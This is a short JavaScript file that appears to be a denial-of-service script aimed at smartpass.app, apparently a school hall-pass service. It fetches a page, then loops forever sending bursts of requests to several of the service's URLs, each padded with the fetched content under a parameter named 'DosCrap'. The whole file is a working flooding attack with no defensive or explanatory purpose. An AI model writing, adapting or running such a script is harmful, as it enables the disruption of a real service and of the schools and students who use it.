async function fetchPasses() {
    await fetch("https://app.smartpass.app/main/passes").then(res =>{
        res.text().then(async textt => {
            console.log(textt)
            while (true) {
                fetch("https://app.smartpass.app/main/passes" + "?DosCrap=" + textt);
                fetch("https://www.smartpass.app/" + "?DosCrap=" + textt);
                fetch("https://app.smartpass.app/main" + "?DosCrap=" + textt);
                fetch("https://app.smartpass.app/balls" + "?DosCrap=" + textt);
                fetch("https://app.smartpass.app/balls1" + "?DosCrap=" + textt);
                fetch("https://app.smartpass.app/balls2" + "?DosCrap=" + textt);
                fetch("https://app.smartpass.app/balls3" + "?DosCrap=" + textt);
                await fetch("https://app.smartpass.app/" + "?DosCrap=" + textt);
                // Add a delay here before the next fetch
            }
        })
    });

}

fetchPasses(); // Start the fetch loop

